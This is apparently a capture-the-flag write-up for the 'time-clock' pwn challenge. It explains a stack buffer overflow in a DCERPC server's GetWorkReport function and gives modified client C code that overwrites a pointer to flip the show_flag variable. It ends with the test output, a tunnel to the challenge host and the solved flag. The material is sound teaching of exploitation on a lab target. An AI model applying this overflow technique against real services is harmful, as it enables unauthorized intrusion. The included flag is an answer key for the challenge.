# time-clock

[library.m0unt41n.ch/challenges/time-clock](https://library.m0unt41n.ch/challenges/time-clock) ![](../../resources/pwn.svg) ![](../../resources/easy.svg) 

# TL;DR

We are given a simple client-server app using
[DCERPC](https://github.com/dcerpc/dcerpc), with client program offering some
commands to access remote API in the server.  One of these commands is `flag`,
but it is guarded by an internal variable that is initialized to zero, preventing
giving the flag out.

The server is running remotely, we only have access with the client program. We
have source code to both though, incl. Docker container used for the remote
instance.

**Solution:** We flip the guarding variable to non-zero, by overflowing
`report_buf` in `GetWorkReport` function in a way, that `*buf_ptr = '\n'` line
writes to the flag instead. We use a modified client program, which encodes the
needed payload in the "report name" (by default, client does not allow
customizing that parameter).

# Overview

Let's see how the system works overall:

```bash
$ tar xzf time-clock.tar.gz
$ cd time-clock/code
$ docker build -t time-clock:latest .
$ docker run -d time-clock:latest
```

The binaries are linked with `dcerpc` library, which is not included in the
Linux distribution (and in any case, we'd rather not run it system-wide as root
for the purpose of this exercise). Let's work inside the container instead.

```
$ docker container exec -it $(docker ps -ql) /bin/bash

root@77427e7c8bef:/code/time-clock# ./time-clock-client 
Invalid number of arguments!
  time-clock-client flag
  time-clock-client report
  time-clock-client log <NAME> <TIME_MINUTES>

root@77427e7c8bef:/code/time-clock# ./time-clock-client log name1 5
Logged 5 minutes for name1

root@77427e7c8bef:/code/time-clock# ./time-clock-client log name2 5
Logged 5 minutes for name2

root@77427e7c8bef:/code/time-clock# ./time-clock-client report
Work report: 
5 minutes worked by employee name1
5 minutes worked by employee name2
Work Report

root@77427e7c8bef:/code/time-clock# ./time-clock-client flag
Flag: 
No flag for you. Keep on working!
```

Let's grab that compiled server binary for further analysis.

```
docker cp $(docker ps -ql):/code/time-clock/time-clock-server .
```

# The code

Looking at the server code, few things come to mind:

*   The flag is guarded by a global `show_flag` variable. It seems that the
    goal is to flip it to non-zero, to unblock flag retrieval.
*   The whole `LogWork` functionality (parsing inputs, hashtable logic, etc.)
    seems well written, with no obvious flaws.
*   `GetWorkReport` has some exploitable spots though:
    *   `sprintf()` into `entry_buf` without checking for the 128b boundary
    *   Followed by a `memcpy()` into `report_buf`, similarly, without much
        attention to 1024b size
    *   Separately, the final `memcpy()` of the `report_name`, with length
        provided as RPC-controlled input

## Closer look at GetWorkReport

Since we will be poking at the stack a lot, let's establish the memor layout.
IDA decompilation of the server we extracted from the container yields:

```c
__int64 __fastcall GetWorkReport(__int64 a1, __int16 a2,
                                 const void *a3, _QWORD *a4) {
  char s[1024];   // [rsp+20h]  [rbp-4A0h]
  char src[136];  // [rsp+420h] [rbp-A0h]
  int v9;         // [rsp+4A8h] [rbp-18h]
  int i;          // [rsp+4ACh] [rbp-14h]
  void *dest;     // [rsp+4B0h] [rbp-10h]
  __int64 j;      // [rsp+4B8h] [rbp-8h]

  memset(s, 0, sizeof(s));
  dest = s;
  for ( i = 0; i <= 100; ++i ) {
    for ( j = hashtable[i]; j; j = *(_QWORD *)j ) {
      v9 = sprintf(src, "%d minutes worked by employee %s\n",
                   *(unsigned int *)(j + 16), *(const char **)(j + 8));
      memcpy(dest, src, v9);
      dest = (char *)dest + v9;
    }
  }
  memcpy(dest, a3, a2);
  dest = (char *)dest + a2;
  *(_BYTE *)dest = 10;
  *a4 = s;
  return 1LL;
}
```

Also `show_flag` is a global variable, at `0x406460`

The decompilation is pretty good, we can immediately see how the variables map
to the source code we have. The only small mismatch is that the `entry_buf`
is decompiled as 136 bytes - probably some padding.

With that, we can annotate GetWorkReport code as follows:

```c
idl_boolean GetWorkReport(rpc_binding_handle_t h, idl_short_int s,
                          idl_byte* report_name, idl_char** report) {
    char report_buf[1024];        // [rsp+20h]  [rbp-4A0h]
    char entry_buf[136];          // [rsp+420h] [rbp-A0h]
    int l;                        // [rsp+4A8h] [rbp-18h]
    int i;                        // [rsp+4ACh] [rbp-14h]
    char *buf_ptr;                // [rsp+4B0h] [rbp-10h]
    struct HashTableEntry* entry; // [rsp+4B8h] [rbp-8h]

    memset(report_buf, 0, 1024);
    buf_ptr = report_buf;
    // Create the work report
    for(i = 0; i < HASHSIZE; i++) {
        for (entry = hashtable[i]; entry != NULL; entry = entry->next) {
            int l = sprintf(entry_buf, "%d minutes worked by employee %s\n",
                            entry->minutes, entry->key);
            memcpy(buf_ptr, entry_buf, l);
            buf_ptr += l;
        }
    }
    // Give the report a name
    memcpy(buf_ptr, report_name, s);
    buf_ptr += s;
    *buf_ptr = '\n';
    *report = report_buf;
    return true;
}
```

# Attack

Of few possible options, let's try to overwrite `buf_ptr` with the final
`memcpy()`, so that the `*buf_ptr = '\n';` writes that `'\n'` to the
`show_flag` variable instead of the report.

## Plan

*   Start fresh instance, don't record any time (so that `for` loop does not
    mess with `buf_ptr`)
*   Prepare a payload that will be passed as `report_name`
    *   First, enough padding to overwrite `report_buf` (1024b), `entry_buf`
        (136b), `l` (4b) and `i` (4b) - 1168 bytes total
    *   Then, 8 bytes with the address of the `show_flag` variable, **minus the
        total size of the payload** (1176b)
*   `memcpy` will overwrite all these variables, putting the final value in
    `buf_ptr`
*   `buf_ptr += s` will add the payload size back to the overwritten value
    *   ... which will put it exactly where we want it to be: pointing at
        `show_flag`
*   Then, `*buf_ptr = '\n'` will set the LSB of `show_flag` variable to a
    non-zero value, unlocking subsequent flag requests.

## Exploit

One small problem is that, with provided client UI, we can not directly change
the `report_name` that is sent via DCERPC. As this is a one-off, we will put the
payload directly in the client code instead.

Updated `main()` function in `src/client.c`:

```c
    (…)
    } else if (strcmp(argv[1], "report") == 0) {
        idl_char* report;

        ///// EXPLOIT
        char report_name[1024+136+4+4+8];
        memset(&report_name[0], 'R', 1024);                       // report_buf
        memset(&report_name[1024], 'E', 136);                     // entry_buf
        memset(&report_name[1024+136], 'I', 4);                   // i
        memset(&report_name[1024+136+4], 'L', 4);                 // l
        *(long*)(&report_name[1024+136+4+4]) = 0x406460 - 1176;   // *buf
        GetWorkReport(time_server, sizeof(report_name), report_name, &report);
        ///// EXPLOIT

        // GetWorkReport(time_server, 11, "Work Report", &report);
        printf("Work report: \n%s\n", report);
    } else if (strcmp(argv[1], "flag") == 0) {
    (…)
```

Note that by using DCERPC binary / modifying the client code it is actually
*easier* to pass this payload, as we don't have to worry how to send zero bytes
for new value of `buf_ptr`. If we tried to exploit regular interface (e.g. by
passing long user names), we would struggle with squeezing these zeros as a
command line argument. 

## Test

*   Add a dummy flag to the `entrypoint.sh` startup script:

    ```bash
    (…)
    echo "Starting dcerpc server"
    FLAG="shc2024{this_is_a_test_flag}" /code/time-clock/time-clock-server
    (…)
    ```

*   Clean up, rebuild an restart the Docker image

    ```
    $ docker kill $(docker ps -ql)
    $ docker build -t time-clock:latest .
    $ docker run -p 5555:5000 -d time-clock:latest
    ```

*   Exploit

    ```
    $ docker container exec -it $(docker ps -q) ./time-clock-client report
    Work report: 
    RRRR

    $ docker container exec -it $(docker ps -q) ./time-clock-client flag
    Flag: 
    shc2024{this_is_a_test_flag}
    ```

Success! 🎉 🎉 🎉 🎉 🎉 🎉:


# Get the real flag

*   Start a live instance on the [SHC
    website](http://ctf.m0unt41n.ch/challenges/time-clock) and add a local tunnel
    on port 5000 to the address provided:

    ```
    $ socat TCP-LISTEN:5000,reuseaddr,fork TCP:ctf.m0unt41n.ch:31337
    ```

*   Grab the modified client binary and the required `libdcerpc.so.1` from within
    the container

    ```
    $ docker cp $(docker ps -ql):/code/time-clock/time-clock-client .
    $ docker cp $(docker ps -ql):/usr/local/lib/libdcerpc.so.1.0.2 ./libdcerpc.so.1
    $ export LD_LIBRARY_PATH=.
    ```

*   Execute:

    ```
    $ ./time-clock-client report
    Work report: 
    RRRR

    $ ./time-clock-client flag
    Flag: 
    shc2024{tick_tock_why_is_it_not_5pm_yet}
    ```

---

## `shc2024{tick_tock_why_is_it_not_5pm_yet}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
